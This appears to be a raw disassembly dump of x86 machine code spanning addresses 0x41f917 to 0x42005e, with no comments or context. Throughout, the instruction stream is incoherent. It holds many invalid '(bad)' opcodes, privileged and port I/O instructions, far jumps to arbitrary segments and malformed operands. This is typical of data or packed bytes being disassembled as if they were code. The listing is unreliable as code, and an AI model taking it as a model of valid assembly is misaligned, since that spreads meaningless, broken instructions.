  41f917:	neg    DWORD PTR [edx+0x42]
  41f91a:	cmp    BYTE PTR [edi-0x7a],ch
  41f91d:	xlat   BYTE PTR ds:[ebx]
  41f91e:	mov    ebx,0x889280d1
  41f923:	sub    eax,0x15ecd8b9
  41f928:	jecxz  0x41f902
  41f92a:	jnp    0x41f9a4
  41f92c:	ficomp DWORD PTR [edx+esi*8+0x2]
  41f930:	inc    eax
  41f931:	and    ebp,DWORD PTR [ebx-0x65]
  41f934:	in     al,dx
  41f935:	gs ja  0x41f8e9
  41f938:	pop    esp
  41f939:	je     0x41f90a
  41f93b:	and    eax,DWORD PTR [ecx-0x6c]
  41f93e:	pop    es
  41f93f:	pop    edi
  41f940:	out    dx,al
  41f941:	or     DWORD PTR [esi],ebx
  41f943:	push   ds
  41f944:	add    esp,DWORD PTR [edi+0x193d13df]
  41f94a:	dec    ecx
  41f94b:	ficomp DWORD PTR [eax+0x3faf8d13]
  41f951:	mov    ecx,0x49caeb0d
  41f956:	ds mov esi,0x42851340
  41f95c:	cmp    al,0xa5
  41f95e:	pop    edx
  41f95f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f960:	nop
  41f961:	pushf  
  41f962:	and    eax,0xce3558ae
  41f967:	hlt    
  41f968:	mov    dl,0x96
  41f96a:	mov    WORD PTR [ebx],gs
  41f96c:	int3   
  41f96d:	and    eax,0xb5224aad
  41f972:	rcl    BYTE PTR [edx+0xf1041f2],1
  41f978:	xor    DWORD PTR [eax-0x10],esi
  41f97b:	out    dx,al
  41f97c:	rcl    BYTE PTR [edx-0x12],cl
  41f97f:	aas    
  41f980:	int3   
  41f981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f982:	jae    0x41f92c
  41f984:	aaa    
  41f985:	pop    es
  41f986:	fmulp  st(7),st
  41f988:	sbb    esi,DWORD PTR [eax]
  41f98a:	cs dec ebx
  41f98c:	ins    DWORD PTR es:[edi],dx
  41f98d:	pusha  
  41f98e:	dec    edx
  41f98f:	test   eax,0xe8cd926a
  41f994:	xor    dh,dl
  41f996:	xor    esp,edi
  41f998:	or     cl,BYTE PTR [eax+0x377b2eac]
  41f99e:	bound  edi,QWORD PTR [ebx+eax*2-0x16d933ad]
  41f9a5:	mov    ebp,0x720cf2a6
  41f9aa:	sbb    al,0x5d
  41f9ac:	loopne 0x41f9ef
  41f9ae:	scas   eax,DWORD PTR es:[edi]
  41f9af:	lahf   
  41f9b0:	jo     0x41f9df
  41f9b2:	sbb    DWORD PTR [eax-0x8],esp
  41f9b5:	dec    edi
  41f9b6:	shl    DWORD PTR [eax-0x25053c9e],1
  41f9bc:	inc    ecx
  41f9bd:	test   DWORD PTR [edx-0xa],0xd2c1eb59
  41f9c4:	mov    esi,0x32acfc78
  41f9c9:	(bad)  
  41f9ca:	and    eax,0xd5c981af
  41f9cf:	push   ecx
  41f9d0:	sar    DWORD PTR [ecx+0x29971ab1],1
  41f9d6:	fs (bad) 
  41f9d8:	and    BYTE PTR [edx],ah
  41f9da:	push   ebx
  41f9db:	pushf  
  41f9dc:	adc    bl,al
  41f9de:	lea    esi,[ecx-0x1e]
  41f9e1:	loopne 0x41f971
  41f9e3:	pop    ebx
  41f9e4:	arpl   WORD PTR [ecx+0x18b0ea77],ax
  41f9ea:	adc    eax,0x6f61069d
  41f9ef:	jmp    0x9fd4:0x20a05540
  41f9f6:	push   ecx
  41f9f7:	xchg   esp,eax
  41f9f8:	int    0xe4
  41f9fa:	pop    ebx
  41f9fb:	ins    DWORD PTR es:[edi],dx
  41f9fc:	(bad)  
  41f9fd:	(bad)  
  41f9fe:	jne    0x41fa3a
  41fa00:	jo     0x41fa54
  41fa02:	out    0x28,eax
  41fa04:	mov    al,ds:0x3001a9dd
  41fa09:	mov    eax,0x21a1558c
  41fa0e:	sar    BYTE PTR [esi],cl
  41fa10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa11:	outs   dx,DWORD PTR ds:[esi]
  41fa13:	fisubr DWORD PTR [esi+ecx*2-0xd]
  41fa17:	jne    0x41fa1a
  41fa19:	shl    DWORD PTR [eax],0x75
  41fa1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa1d:	dec    ebp
  41fa1e:	push   edi
  41fa1f:	sar    BYTE PTR [eax-0x67],1
  41fa22:	cmp    eax,0x528839e4
  41fa27:	inc    ebx
  41fa28:	mov    edi,0x99fa4be
  41fa2d:	and    DWORD PTR [eax],esp
  41fa2f:	mov    BYTE PTR [edi+0x1c438b4],0xef
  41fa36:	rcl    BYTE PTR [edi-0x27c3b627],1
  41fa3c:	jl     0x41fa62
  41fa3e:	or     BYTE PTR ds:0xcc1a49a6,cl
  41fa44:	sbb    eax,0x53025ecb
  41fa49:	popf   
  41fa4a:	mov    eax,0xf8b39533
  41fa4f:	jmp    0x41f9df
  41fa51:	dec    edi
  41fa52:	test   al,0xec
  41fa54:	cmp    BYTE PTR [ebp-0x120d071a],ch
  41fa5a:	(bad)  
  41fa5b:	jecxz  0x41fa62
  41fa5d:	data16 lods al,BYTE PTR ds:[esi]
  41fa5f:	jle    0x41fad8
  41fa61:	repz (bad) [edi-0x62]
  41fa65:	fdivr  QWORD PTR [edi+0x6a]
  41fa68:	jp     0x41fabd
  41fa6a:	xor    BYTE PTR [esi],0x24
  41fa6d:	xor    edi,DWORD PTR [edi]
  41fa6f:	xchg   esi,eax
  41fa70:	out    0x46,eax
  41fa72:	jo     0x41fa8d
  41fa74:	loopne 0x41fa71
  41fa76:	pop    es
  41fa77:	aam    0x82
  41fa79:	test   al,0xd5
  41fa7b:	cs cmp al,0x70
  41fa7e:	icebp  
  41fa7f:	sbb    al,BYTE PTR [ebx-0x75f0d455]
  41fa85:	fdivr  QWORD PTR [ebp+ebx*4+0x7d]
  41fa89:	sub    dl,dl
  41fa8b:	jmp    0x60c8:0x755b03f0
  41fa92:	ja     0x41fa7d
  41fa94:	in     eax,0x97
  41fa96:	jae    0x41fa93
  41fa98:	shl    edi,cl
  41fa9a:	push   ecx
  41fa9b:	jmp    0x19ddc93f
  41faa0:	in     eax,0x30
  41faa2:	jmp    0x3e19:0x64b2d96d
  41faa9:	add    ch,BYTE PTR [esi]
  41faab:	in     al,0xc8
  41faad:	nop
  41faae:	adc    al,0xd
  41fab0:	xor    DWORD PTR [ecx-0x307bab13],eax
  41fab6:	in     al,dx
  41fab7:	rol    BYTE PTR [ecx],cl
  41fab9:	or     al,0x24
  41fabb:	xchg   edi,eax
  41fabc:	sub    ecx,edx
  41fabe:	test   eax,0x5a139c0
  41fac3:	ret    
  41fac4:	stos   BYTE PTR es:[edi],al
  41fac5:	push   esi
  41fac6:	test   al,0xc3
  41fac8:	xchg   esp,eax
  41fac9:	or     ebp,DWORD PTR [ecx-0x7d5b7295]
  41facf:	loop   0x41fb36
  41fad1:	in     eax,0x4e
  41fad3:	inc    eax
  41fad4:	aam    0x1
  41fad6:	inc    ecx
  41fad7:	sbb    edi,DWORD PTR [ebp-0x40]
  41fada:	shr    BYTE PTR [esi],cl
  41fadc:	cli    
  41fadd:	fnstcw WORD PTR [ebx+eiz*8+0x54]
  41fae1:	gs out dx,eax
  41fae3:	or     eax,0x5db4002d
  41fae8:	out    dx,al
  41fae9:	push   edi
  41faea:	int3   
  41faeb:	push   edx
  41faec:	daa    
  41faed:	pop    ebp
  41faee:	pop    ds
  41faef:	xchg   DWORD PTR [ecx-0x50b4d053],esp
  41faf5:	jge    0x41fb0f
  41faf7:	jle    0x41fb72
  41faf9:	int    0x5a
  41fafb:	dec    BYTE PTR ds:0x87207ce8
  41fb01:	adc    eax,0x72958c43
  41fb06:	sbb    edx,eax
  41fb08:	imul   ecx,esp,0x7af68184
  41fb0e:	jne    0x41fb84
  41fb10:	pusha  
  41fb11:	(bad)  
  41fb12:	ds xchg bh,ch
  41fb15:	nop
  41fb16:	dec    edi
  41fb17:	pushf  
  41fb18:	mov    al,0xea
  41fb1a:	rcr    BYTE PTR [ebp+0x20],cl
  41fb1d:	sub    al,dh
  41fb1f:	jecxz  0x41fb4c
  41fb21:	neg    DWORD PTR [ecx]
  41fb23:	enter  0x60a8,0xbe
  41fb27:	fsub   QWORD PTR [ecx]
  41fb29:	sub    esp,DWORD PTR [ecx+0x5ae16c10]
  41fb2f:	fist   WORD PTR [ecx]
  41fb31:	xchg   esp,eax
  41fb32:	dec    esp
  41fb33:	xlat   BYTE PTR ds:[ebx]
  41fb34:	xchg   edx,eax
  41fb35:	les    esp,FWORD PTR [edx-0x6d]
  41fb38:	(bad)  
  41fb39:	repnz sub BYTE PTR [esi+0x7a],ch
  41fb3d:	fwait
  41fb3e:	nop
  41fb3f:	leave  
  41fb40:	popa   
  41fb41:	cdq    
  41fb42:	cli    
  41fb43:	test   al,0x0
  41fb45:	jmp    0x41fb0b
  41fb47:	aaa    
  41fb48:	jne    0x41fb28
  41fb4a:	sub    BYTE PTR [edx-0x11896422],dl
  41fb50:	pushf  
  41fb51:	pop    edi
  41fb52:	jae    0x41fbc2
  41fb54:	add    al,0x4d
  41fb56:	(bad)  
  41fb57:	cmp    bh,BYTE PTR [ebx-0x6b]
  41fb5a:	test   al,0xc9
  41fb5c:	or     al,0xa9
  41fb5e:	jmp    0x4ab2:0x8ecbe0e5
  41fb65:	or     DWORD PTR [ecx],ecx
  41fb67:	mov    ecx,0x5b3cb8d8
  41fb6c:	adc    eax,0x876af7a3
  41fb71:	push   edi
  41fb72:	icebp  
  41fb73:	sahf   
  41fb74:	add    al,0xfb
  41fb76:	scas   al,BYTE PTR es:[edi]
  41fb77:	mov    eax,ds:0x4304a85a
  41fb7c:	jmp    0x75ff4468
  41fb81:	loop   0x41fb6f
  41fb83:	sbb    al,BYTE PTR [esi-0x3c6f26a2]
  41fb89:	mov    edi,0x8fbd9110
  41fb8e:	push   ecx
  41fb8f:	cmp    ebx,esi
  41fb91:	lds    edx,FWORD PTR [ebx+0xb88cbc6]
  41fb97:	int3   
  41fb98:	mov    esi,0xdef480a4
  41fb9d:	syscall 
  41fb9f:	test   eax,0x393fa335
  41fba4:	popf   
  41fba5:	dec    ebx
  41fba6:	jbe    0x41fbb4
  41fba8:	test   al,0xf0
  41fbaa:	stos   DWORD PTR es:[edi],eax
  41fbab:	dec    ebp
  41fbac:	mov    ?,WORD PTR [eax]
  41fbae:	shl    bh,0x79
  41fbb1:	sub    ah,0xb6
  41fbb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbb5:	or     DWORD PTR [ecx-0x23],ebp
  41fbb8:	test   ebp,eax
  41fbba:	cmp    DWORD PTR [edx-0x48],esi
  41fbbd:	das    
  41fbbe:	mov    dl,0x3f
  41fbc0:	jns    0x41fbaa
  41fbc2:	fcomp  DWORD PTR [edi+ebx*1-0x2cfb684c]
  41fbc9:	sub    bh,BYTE PTR [esi+0x4bca789]
  41fbcf:	ins    DWORD PTR es:[edi],dx
  41fbd0:	jmp    0x646c:0x79038033
  41fbd7:	hlt    
  41fbd8:	jecxz  0x41fc18
  41fbda:	sbb    ch,BYTE PTR [ecx-0x3b334e22]
  41fbe0:	sub    bl,dl
  41fbe2:	push   eax
  41fbe3:	push   ebp
  41fbe4:	ficomp WORD PTR [edi-0x64]
  41fbe7:	loopne 0x41fbfe
  41fbe9:	jo     0x41fba5
  41fbeb:	cdq    
  41fbec:	shl    BYTE PTR [edi],0x5
  41fbef:	bound  esp,QWORD PTR [ebx-0x59]
  41fbf2:	xchg   ebx,eax
  41fbf3:	(bad)  [edx+0x1d]
  41fbf6:	sahf   
  41fbf7:	jge    0x41fc73
  41fbf9:	mov    WORD PTR [edx-0x579cfcd0],fs
  41fbff:	sub    DWORD PTR [ebx+0x45],esp
  41fc02:	mov    esi,0xd9b9cd76
  41fc07:	call   0x817d56aa
  41fc0c:	jns    0x41fbfd
  41fc0e:	scas   al,BYTE PTR es:[edi]
  41fc0f:	nop
  41fc10:	ror    BYTE PTR [ecx+edi*8+0x5e],0x5e
  41fc15:	xchg   ecx,eax
  41fc16:	(bad)
  41fc1a:	loopne 0x41fbd6
  41fc1c:	loop   0x41fbe9
  41fc1e:	stc    
  41fc1f:	or     esi,ebp
  41fc21:	loopne 0x41fbe1
  41fc23:	push   es
  41fc24:	loope  0x41fc30
  41fc26:	cmp    DWORD PTR [ebx-0x4],esi
  41fc29:	ins    BYTE PTR es:[edi],dx
  41fc2a:	daa    
  41fc2b:	pshufw mm7,QWORD PTR [edx],0x52
  41fc2f:	rcr    cl,0xd0
  41fc32:	mov    ebp,DWORD PTR [ebx-0x3b923bba]
  41fc38:	sbb    eax,0x326e05c0
  41fc3d:	ret    
  41fc3e:	retf   
  41fc3f:	mov    ?,WORD PTR [esi]
  41fc41:	arpl   WORD PTR [eiz*4-0x56485fb6],bp
  41fc48:	push   eax
  41fc49:	idiv   DWORD PTR [edx+eax*1+0x25]
  41fc4d:	retf   
  41fc4e:	idiv   BYTE PTR [edx]
  41fc50:	rcr    BYTE PTR [ebp+0x41],cl
  41fc53:	inc    eax
  41fc54:	mov    ebp,0x5eeea758
  41fc59:	or     DWORD PTR [ebx-0x306671f],eax
  41fc5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc60:	(bad)  
  41fc61:	mov    esi,0x69a42ee9
  41fc66:	cmp    BYTE PTR [ecx*1+0x2652aa4d],0x75
  41fc6e:	push   ebx
  41fc6f:	pop    ecx
  41fc70:	loopne 0x41fc60
  41fc72:	fmul   QWORD PTR [ebp+0xb]
  41fc75:	pop    edi
  41fc76:	mov    eax,0x9e666dc9
  41fc7b:	add    ah,BYTE PTR [edx-0x74]
  41fc7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc7f:	in     al,dx
  41fc80:	jmp    0x55056cac
  41fc85:	(bad)  
  41fc86:	icebp  
  41fc87:	fs sub eax,0x4a44a0c9
  41fc8d:	add    bl,BYTE PTR [ebp+0x5d6da2d]
  41fc93:	mov    ah,0xac
  41fc95:	push   0xffffffb2
  41fc97:	jo     0x41fc5b
  41fc99:	pop    ss
  41fc9a:	or     al,dh
  41fc9c:	out    0xef,al
  41fc9e:	test   DWORD PTR [edi-0x2db2d4da],edx
  41fca4:	cmp    al,0xe8
  41fca6:	push   ss
  41fca7:	int    0xd4
  41fca9:	sbb    edi,DWORD PTR [edx+0x5]
  41fcac:	cwde   
  41fcad:	aaa    
  41fcae:	popa   
  41fcaf:	add    bl,BYTE PTR [ebp+0x7f]
  41fcb2:	cmp    BYTE PTR [ecx],cl
  41fcb4:	adc    DWORD PTR [ebx+eiz*1+0x19de679f],eax
  41fcbb:	aam    0x81
  41fcbd:	ss push ebx
  41fcbf:	jns    0x41fd23
  41fcc1:	dec    esp
  41fcc2:	mov    ebx,0x6914f03d
  41fcc7:	(bad)  
  41fcc8:	mov    BYTE PTR [ebx],ch
  41fcca:	mov    ebp,0xb05cdfa4
  41fccf:	add    ecx,0x22
  41fcd2:	sub    ch,BYTE PTR [esi*4+0x206aca55]
  41fcd9:	mov    esp,0x7092cca1
  41fcde:	adc    ch,ah
  41fce0:	pop    eax
  41fce1:	mov    dl,BYTE PTR ds:0xe1f3150a
  41fce7:	fisub  DWORD PTR ss:[ecx+edi*8-0x25]
  41fcec:	sub    eax,ebx
  41fcee:	pop    es
  41fcef:	mov    eax,0x27128141
  41fcf4:	pushf  
  41fcf5:	mov    al,0x3f
  41fcf7:	dec    esi
  41fcf8:	mov    edx,0x25e25371
  41fcfd:	xor    BYTE PTR [edi-0xaa5e305],al
  41fd03:	pusha  
  41fd04:	sbb    eax,0x467d142
  41fd09:	sbb    al,0x4b
  41fd0b:	out    dx,al
  41fd0c:	inc    ebp
  41fd0d:	pop    esi
  41fd0e:	popw   ss
  41fd10:	add    dh,BYTE PTR [edx-0x52]
  41fd13:	shl    DWORD PTR [edi-0x229e2c8d],1
  41fd19:	lahf   
  41fd1a:	xchg   esi,eax
  41fd1b:	xchg   esp,eax
  41fd1c:	dec    esp
  41fd1d:	dec    ebx
  41fd1e:	stc    
  41fd1f:	xchg   DWORD PTR [edx+0x14e3d08f],ecx
  41fd25:	cs jmp 0xf9932a84
  41fd2b:	aas    
  41fd2c:	lahf   
  41fd2d:	pop    ebp
  41fd2e:	cmp    DWORD PTR [eax],esp
  41fd30:	push   edi
  41fd31:	and    bl,BYTE PTR [edi-0x1d]
  41fd34:	aaa    
  41fd35:	cmp    DWORD PTR [edx+0x4e562232],0x3c
  41fd3c:	mov    ch,0x4a
  41fd3e:	push   esi
  41fd3f:	mov    dl,0xb0
  41fd41:	sub    DWORD PTR [esi-0x30bc4e9c],edx
  41fd47:	les    ebp,FWORD PTR [ebx+0xe]
  41fd4a:	mov    ebp,0x561e93dc
  41fd4f:	fwait
  41fd50:	or     BYTE PTR [esi+0x5e261114],dl
  41fd56:	lahf   
  41fd57:	aaa    
  41fd58:	sti    
  41fd59:	lahf   
  41fd5a:	xchg   edi,eax
  41fd5b:	outs   dx,DWORD PTR ds:[esi]
  41fd5c:	add    BYTE PTR [eax],0xe7
  41fd5f:	aam    0xd7
  41fd61:	cmp    DWORD PTR [ebp-0x6587b6e9],esi
  41fd67:	sub    edi,0x78
  41fd6a:	fsubr  DWORD PTR [edi+0x4ab7a425]
  41fd70:	int    0x77
  41fd72:	aaa    
  41fd73:	push   esi
  41fd74:	jle    0x41fdc0
  41fd76:	retf   0x79dc
  41fd79:	and    BYTE PTR [esi],ah
  41fd7b:	push   esp
  41fd7c:	pop    ebx
  41fd7d:	fimul  WORD PTR ds:[esi+edi*1]
  41fd82:	add    al,0x3c
  41fd84:	(bad)  
  41fd85:	xor    eax,ebx
  41fd87:	cmp    al,0x2b
  41fd89:	push   esi
  41fd8a:	sar    ah,cl
  41fd8c:	das    
  41fd8d:	int3   
  41fd8e:	pop    ebp
  41fd8f:	test   BYTE PTR [esi],ch
  41fd91:	imul   eax,DWORD PTR [esi-0xc],0xffffffc9
  41fd95:	inc    esp
  41fd96:	icebp  
  41fd97:	and    ah,BYTE PTR [eax+0xf76cacf]
  41fd9d:	pop    ebp
  41fd9e:	adc    DWORD PTR [ebp-0x6976c0ed],ecx
  41fda4:	leave  
  41fda5:	aad    0xd
  41fda7:	or     esi,esi
  41fda9:	lock mov ch,0x8a
  41fdac:	mov    dh,BYTE PTR [edx]
  41fdae:	add    eax,0x30b3dff1
  41fdb3:	jo     0x41fe09
  41fdb5:	and    ecx,ebp
  41fdb7:	sub    DWORD PTR [ecx+edi*2-0x4f],0x73
  41fdbc:	daa    
  41fdbd:	mov    cs,WORD PTR [esp+ebx*8+0x75296bf1]
  41fdc4:	mov    ah,0xaf
  41fdc6:	fcom   QWORD PTR ds:0x2eab53f9
  41fdcc:	mov    ebp,ecx
  41fdce:	xor    edi,0x5f82e38d
  41fdd4:	mov    gs,eax
  41fdd6:	sub    cl,BYTE PTR [ebx-0xd]
  41fdd9:	and    edx,DWORD PTR [esi]
  41fddb:	and    BYTE PTR [esi+0x3070803a],bh
  41fde1:	push   esi
  41fde2:	push   ds
  41fde3:	clc    
  41fde4:	pop    ebp
  41fde5:	shl    BYTE PTR [ecx],cl
  41fde7:	mov    edi,0x270012c1
  41fdec:	imul   DWORD PTR [ebx]
  41fdee:	jmp    0xaef99de5
  41fdf3:	add    DWORD PTR [eax],edx
  41fdf5:	jo     0x41fe37
  41fdf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdf8:	neg    DWORD PTR ds:0xea19ccb0
  41fdfe:	loopne 0x41fe61
  41fe00:	mov    ds:0xbb04b2f6,eax
  41fe05:	addps  xmm6,XMMWORD PTR [ebx+0x6a]
  41fe09:	mov    ds:0x1a202ef2,eax
  41fe0e:	pop    esi
  41fe0f:	iret   
  41fe10:	push   0xe41d0f0b
  41fe15:	iret   
  41fe16:	js     0x41fdd5
  41fe18:	ins    BYTE PTR es:[edi],dx
  41fe19:	int3   
  41fe1a:	sub    edx,DWORD PTR [eax+0x7ec97342]
  41fe20:	(bad)  
  41fe21:	fdiv   DWORD PTR [edi-0x1e]
  41fe24:	jbe    0x41fdec
  41fe26:	out    dx,eax
  41fe27:	sbb    al,0x69
  41fe29:	inc    esp
  41fe2a:	add    bl,ah
  41fe2c:	or     dh,BYTE PTR [edx+0x7f]
  41fe2f:	cmc    
  41fe30:	aas    
  41fe31:	sbb    al,0xe6
  41fe33:	mov    ds:0xa566f942,eax
  41fe38:	mov    BYTE PTR [eax],cl
  41fe3a:	pop    edi
  41fe3b:	cld    
  41fe3c:	add    bh,0x5
  41fe3f:	stos   BYTE PTR es:[edi],al
  41fe40:	loope  0x41fdeb
  41fe42:	gs pop edx
  41fe44:	push   ebp
  41fe45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe46:	xchg   edx,eax
  41fe47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe48:	jb     0x41fe2e
  41fe4a:	inc    ecx
  41fe4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe4c:	sbb    DWORD PTR [ebx-0x1a],ebp
  41fe4f:	sub    dh,BYTE PTR [edi]
  41fe51:	adc    ah,0xf0
  41fe54:	fwait
  41fe55:	pop    edx
  41fe56:	jb     0x41fe7f
  41fe58:	cwde   
  41fe59:	stos   DWORD PTR es:[edi],eax
  41fe5a:	jo     0x41fe42
  41fe5c:	in     al,0x65
  41fe5e:	(bad)  
  41fe5f:	test   DWORD PTR [ecx+0x6d7381e7],0x1e93ffe4
  41fe69:	sub    bh,BYTE PTR [esi+0x1e]
  41fe6c:	in     eax,0x4
  41fe6e:	je     0x41fee2
  41fe70:	push   cs
  41fe71:	jge    0x41fe07
  41fe73:	sbb    esi,DWORD PTR [esi+0x5f]
  41fe76:	push   es
  41fe77:	lods   al,BYTE PTR ds:[esi]
  41fe78:	inc    ecx
  41fe79:	dec    ebx
  41fe7a:	push   cs
  41fe7b:	dec    ebx
  41fe7c:	push   ebp
  41fe7d:	mov    ebp,0x9abaf235
  41fe82:	or     ebx,eax
  41fe84:	mov    ah,0x8b
  41fe86:	div    al
  41fe88:	lods   al,BYTE PTR ds:[esi]
  41fe89:	aas    
  41fe8a:	add    ch,ch
  41fe8c:	inc    esi
  41fe8d:	sub    dh,dl
  41fe8f:	out    dx,al
  41fe90:	fbstp  TBYTE PTR [ecx+0x6dae21b0]
  41fe96:	jno    0x41fe62
  41fe98:	in     eax,dx
  41fe99:	xor    ebp,DWORD PTR [ebx+edi*2-0x234592bd]
  41fea0:	sub    eax,0x5c58654f
  41fea5:	xlat   BYTE PTR ds:[ebx]
  41fea6:	dec    edi
  41fea7:	lds    edi,FWORD PTR [edx+0x17f83f2f]
  41fead:	cmp    al,0x5
  41feaf:	mov    ebp,eax
  41feb1:	loop   0x41feed
  41feb3:	jns    0x41fe5e
  41feb5:	ins    BYTE PTR es:[edi],dx
  41feb6:	or     eax,DWORD PTR [esi]
  41feb8:	jnp    0x41fe84
  41feba:	pop    ss
  41febb:	pop    ss
  41febc:	enter  0x6780,0x11
  41fec0:	dec    ecx
  41fec1:	ja     0x41fea4
  41fec3:	dec    esi
  41fec4:	pop    ds
  41fec5:	(bad)  
  41fec6:	dec    ebx
  41fec7:	test   al,0xb6
  41fec9:	adc    bh,BYTE PTR [esp+ebx*2]
  41fecc:	push   esp
  41fecd:	call   edi
  41fecf:	test   BYTE PTR [ecx+0x217d8b42],dh
  41fed5:	not    DWORD PTR [esi+edi*4+0x43]
  41fed9:	pop    eax
  41feda:	lods   al,BYTE PTR ds:[esi]
  41fedb:	mov    ds:0xebc18483,eax
  41fee0:	push   edx
  41fee1:	push   esp
  41fee2:	cmc    
  41fee3:	lods   al,BYTE PTR ds:[esi]
  41fee4:	inc    ebx
  41fee5:	add    DWORD PTR fs:[esi-0x72],edi
  41fee9:	imul   ebx,eax,0x2e1a973d
  41feef:	pop    esp
  41fef0:	push   ecx
  41fef1:	les    ebx,FWORD PTR [edx-0x426301a8]
  41fef7:	xor    DWORD PTR [edi+0x6d],ebx
  41fefa:	fld    TBYTE PTR ss:[ebx]
  41fefd:	add    bl,BYTE PTR [esi+0x53]
  41ff00:	add    BYTE PTR [edi+0x6f8f9ed2],0x78
  41ff07:	dec    ecx
  41ff08:	add    eax,0x5ab8bca2
  41ff0d:	into   
  41ff0e:	fidivr WORD PTR [esi+0x53c34e8f]
  41ff14:	jecxz  0x41ff37
  41ff16:	push   ebp
  41ff17:	cmp    esp,DWORD PTR [edi+0x624731b6]
  41ff1d:	test   eax,0x33c8071d
  41ff22:	out    0x5d,eax
  41ff24:	clc    
  41ff25:	iret   
  41ff26:	cmp    eax,DWORD PTR [esi-0x46]
  41ff29:	jle    0x41ff68
  41ff2b:	lahf   
  41ff2c:	pop    esi
  41ff2d:	fistp  QWORD PTR [ecx]
  41ff2f:	or     al,0x2b
  41ff31:	fnstenv [esi+edx*1]
  41ff34:	popa   
  41ff35:	sbb    BYTE PTR [edx],bh
  41ff37:	xchg   edi,eax
  41ff38:	ins    BYTE PTR es:[edi],dx
  41ff39:	add    eax,DWORD PTR [ecx+0x10]
  41ff3c:	gs cmp al,0x49
  41ff3f:	cdq    
  41ff40:	dec    esi
  41ff41:	or     bl,bh
  41ff43:	xchg   DWORD PTR [eax+0x3870bf95],esp
  41ff49:	dec    ecx
  41ff4a:	mov    ds:0x3807f548,eax
  41ff4f:	cmc    
  41ff50:	ja     0x41ff9c
  41ff52:	adc    ah,BYTE PTR [edx]
  41ff54:	imul   eax,DWORD PTR [edx+0x8],0x3f0f6f32
  41ff5b:	dec    ebp
  41ff5c:	int    0x42
  41ff5e:	icebp  
  41ff5f:	mov    BYTE PTR [esp+esi*8+0x393e2350],cl
  41ff66:	inc    esi
  41ff67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff68:	repz adc esp,DWORD PTR [ebp+0x4c90f0df]
  41ff6f:	pop    DWORD PTR [esi+0x2575d6e3]
  41ff75:	repz push es
  41ff77:	mov    eax,0xa949f28b
  41ff7c:	sahf   
  41ff7d:	pop    ecx
  41ff7e:	adc    BYTE PTR [edx],al
  41ff80:	jb     0x41ff32
  41ff82:	add    esp,DWORD PTR [ecx-0x7]
  41ff85:	push   cs
  41ff86:	push   ds
  41ff87:	fcom   QWORD PTR [ecx-0x1f073ad3]
  41ff8d:	mov    bh,0x3d
  41ff8f:	pop    edi
  41ff90:	xor    al,0x91
  41ff92:	mov    cl,0x97
  41ff94:	das    
  41ff95:	sub    edx,DWORD PTR [edi-0x41b6902a]
  41ff9b:	mov    ebx,0xaa5b51dc
  41ffa0:	jp     0x41ff69
  41ffa2:	push   0xe85d3051
  41ffa7:	add    dl,BYTE PTR [edi+edx*8-0x2c9e666a]
  41ffae:	imul   ebx,esp,0xf610aa99
  41ffb4:	xor    cl,dh
  41ffb6:	ret    
  41ffb7:	ficom  WORD PTR [edx]
  41ffb9:	jecxz  0x41ffdb
  41ffbb:	add    bl,ah
  41ffbd:	or     edx,DWORD PTR [esp+ecx*1+0xa39a898]
  41ffc4:	add    al,0x89
  41ffc6:	adc    cl,al
  41ffc8:	mov    DWORD PTR [ecx+0x17],ebx
  41ffcb:	sbb    BYTE PTR [ebp+eax*1+0x73],0x7b
  41ffd0:	jne    0x41ff70
  41ffd2:	imul   edx,DWORD PTR [esi],0xffffff8c
  41ffd5:	nop
  41ffd6:	mov    dh,0x5c
  41ffd8:	and    eax,0xf05c0e10
  41ffdd:	mov    es,WORD PTR [eax]
  41ffdf:	and    BYTE PTR [esp-0x73],dl
  41ffe3:	sti    
  41ffe4:	in     eax,dx
  41ffe5:	jb     0x420014
  41ffe7:	mov    ecx,0xe5f83d4b
  41ffec:	push   es
  41ffed:	in     al,dx
  41ffee:	stos   DWORD PTR es:[edi],eax
  41ffef:	scas   al,BYTE PTR es:[edi]
  41fff0:	xor    esp,DWORD PTR [ecx+0x31]
  41fff3:	xor    BYTE PTR [ebx+0x1a],dh
  41fff6:	stos   BYTE PTR es:[edi],al
  41fff7:	or     BYTE PTR ds:0x47a789f9,cl
  41fffd:	dec    edx
  41fffe:	mov    ah,bh
  420000:	jne    0x41ff9c
  420002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420003:	jmp    0x74603aa6
  420008:	pop    eax
  420009:	fstp   TBYTE PTR [esi-0x1e]
  42000c:	add    al,0xcc
  42000e:	aas    
  42000f:	inc    edi
  420010:	pusha  
  420011:	inc    ecx
  420012:	jo     0x42003f
  420014:	mov    ecx,esp
  420016:	lea    ecx,[edx+0x45]
  420019:	xchg   ecx,eax
  42001a:	jnp    0x41ffcd
  42001c:	dec    edi
  42001d:	cli    
  42001e:	mov    DWORD PTR [edi+0x6c1ad9a6],eax
  420024:	add    ch,dh
  420026:	loop   0x41ffe0
  420028:	push   0xffffffd6
  42002a:	retf   0x3640
  42002d:	cmp    bl,BYTE PTR [ecx+ebx*1]
  420030:	inc    ebx
  420031:	dec    ecx
  420032:	ja     0x41ffb6
  420034:	inc    esi
  420035:	sbb    ah,bh
  420037:	xor    al,0x8e
  420039:	xchg   ecx,eax
  42003a:	pop    edx
  42003b:	xchg   ecx,eax
  42003c:	inc    eax
  42003d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42003e:	fdivr  DWORD PTR [ecx+0x16deb3dc]
  420044:	add    dl,dl
  420046:	cmp    ebp,ecx
  420048:	aas    
  420049:	pop    esi
  42004a:	aad    0xb0
  42004c:	dec    ebp
  42004d:	xor    esp,ecx
  42004f:	sub    al,0x3b
  420051:	leave  
  420052:	repz cmc 
  420054:	jb     0x420090
  420056:	imul   ebx,DWORD PTR [esi],0x46babdf8
  42005c:	hlt    
  42005d:	aas    
  42005e:	and    eax,0x6c0932f6
